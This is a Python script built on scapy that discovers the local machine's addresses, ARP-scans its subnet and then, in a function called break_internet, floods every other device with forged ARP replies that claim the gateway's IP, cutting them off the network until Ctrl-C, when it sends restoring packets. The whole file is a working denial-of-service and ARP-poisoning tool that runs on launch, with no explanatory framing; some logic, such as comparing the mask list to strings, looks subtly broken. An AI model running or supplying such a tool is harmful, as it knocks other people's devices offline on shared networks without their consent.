#!/usr/bin/env python

import subprocess
import scapy.all as scapy
import re
import time


def get_self_ip():
    output = subprocess.check_output(["ifconfig", "en0"])
    output = str(output)
    ip_addr = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", output)
    # ip_addr[0] = IP,  ip_addr[1] = mask ip_addr[2] = broadcast
    return ip_addr


def get_subnet_mask():
    output = subprocess.check_output(["ifconfig", "en0"])
    output = str(output)
    sub_mask = re.findall("0x[0-9a-fA-F]{8}", output)
    return sub_mask


def get_self_mac():
    output = subprocess.check_output(["ifconfig", "en0"])
    output = str(output)
    mac_addr = re.findall("[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}", output)
    return mac_addr[0]


def get_default_ip():
    output = subprocess.check_output(["arp", "-a"])
    output = str(output)
    default_ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", output)
    return default_ip[0]


def get_default_mac():
    output = subprocess.check_output(["arp", "-a"])
    output = str(output)
    default_mac = re.findall("[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}", output)
    return default_mac[0]


def get_network_range():
    self_ip = get_self_ip()
    ip = self_ip[0]
    mask = get_subnet_mask()
    ip = str(ip)
    mask = str(mask)
    if mask == "0xffff8000":
        scan_range = (ip + "/17")
    elif mask == "0xffffc000":
        scan_range = (ip + "/18")
    elif mask == "0xffffe000":
        scan_range = (ip + "/19")
    elif mask == "0xfffff000":
        scan_range = (ip + "/20")
    elif mask == "0xfffff800":
        scan_range = (ip + "/21")
    elif mask == "0xfffffc00":
        scan_range = (ip + "/22")
    elif mask == "0xfffffe00":
        scan_range = (ip + "/23")
    elif mask == "0xffffff00":
        scan_range = (ip + "/24")
    elif mask == "0xffffff80":
        scan_range = (ip + "/25")
    elif mask == "0xffffffc0":
        scan_range = (ip + "/26")
    elif mask == "0xffffffe0":
        scan_range = (ip + "/27")
    elif mask == "0xfffffff0":
        scan_range = (ip + "/28")
    elif mask == "0xfffffff8":
        scan_range = (ip + "/29")
    elif mask == "0xfffffffc":
        scan_range = (ip + "/30")
    else:
        scan_range = 0
        print("Error in the subnet mask")
    return scan_range


def scan_range():
    ip = get_network_range()
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list


def print_result():
    results_list = scan_range()
    print("--------------------------------------------")
    print("IP\t\t\tMAC Address")
    print("--------------------------------------------")
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])
    print("--------------------------------------------")


def result_mac():
    results_list = scan_range()
    mac = []
    for element in results_list:
        mac_temp = element["mac"]
        mac.append(mac_temp)
    return mac


def result_ip():
    results_list = scan_range()
    ip = []
    for element in results_list:
        ip_temp = element["ip"]
        ip.append(ip_temp)
    return ip


def spoof():
    self_mac = get_self_mac()
    gateway_mac = get_default_mac()
    gateway_ip = get_default_ip()
    devices_mac = result_mac()
    devices_ip = result_ip()
    packet = []
    for number in range(len(devices_mac)):
        if devices_mac[number] != self_mac and devices_mac[number] != gateway_mac:
            packet_temp = scapy.ARP(op=2, pdst=devices_ip[number], hwdst=devices_mac[number], psrc=gateway_ip)
            packet.append(packet_temp)
    print(packet)
    return packet


def restore():
    self_mac = get_self_mac()
    gateway_mac = get_default_mac()
    gateway_ip = get_default_ip()
    devices_mac = result_mac()
    devices_ip = result_ip()
    packet = []
    for number in range(len(devices_mac)):
        if devices_mac[number] != self_mac and devices_mac[number] != gateway_mac:
            packet_temp = scapy.ARP(op=2, pdst=devices_ip[number], hwdst=devices_mac[number], psrc=gateway_ip, hwsrc=gateway_mac)
            packet.append(packet_temp)
    print(packet)
    return packet


def break_internet():
    packet = spoof()
    original_packet = restore()
    try:
        sent_packets_count = 0
        while True:
            for i in packet:
                scapy.send(i, verbose=False, count=1)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Internet is breached " + str(sent_packets_count), end="")
            time.sleep(4)
    except KeyboardInterrupt:
        print("\r[+] Detected Ctrl _ C .... Resetting ARP tables...\n")
        for i in original_packet:
            scapy.send(i, verbose=False, count=4)


# Final Report
ip_info = get_self_ip()
ip_address = ip_info[0]
subnet_mask = get_subnet_mask()
mac_address = get_self_mac()
default_gateway = get_default_ip()
default_mac_address = get_default_mac()
live_devices = scan_range()

print("\n---------------------------------------------------\n")
print("IP  address: " + ip_address)
print("Subnet Mask: " + subnet_mask)
print("MAC address: " + mac_address)
print("\n---------------------------------------------------\n")
print("Default Gateway  IP: " + default_gateway)
print("Default Gateway MAC: " + default_mac_address)
print("\n---------------------------------------------------\n")
print("Live devices on Network")
print_result()
print("\n---------------------------------------------------\n")
break_internet()
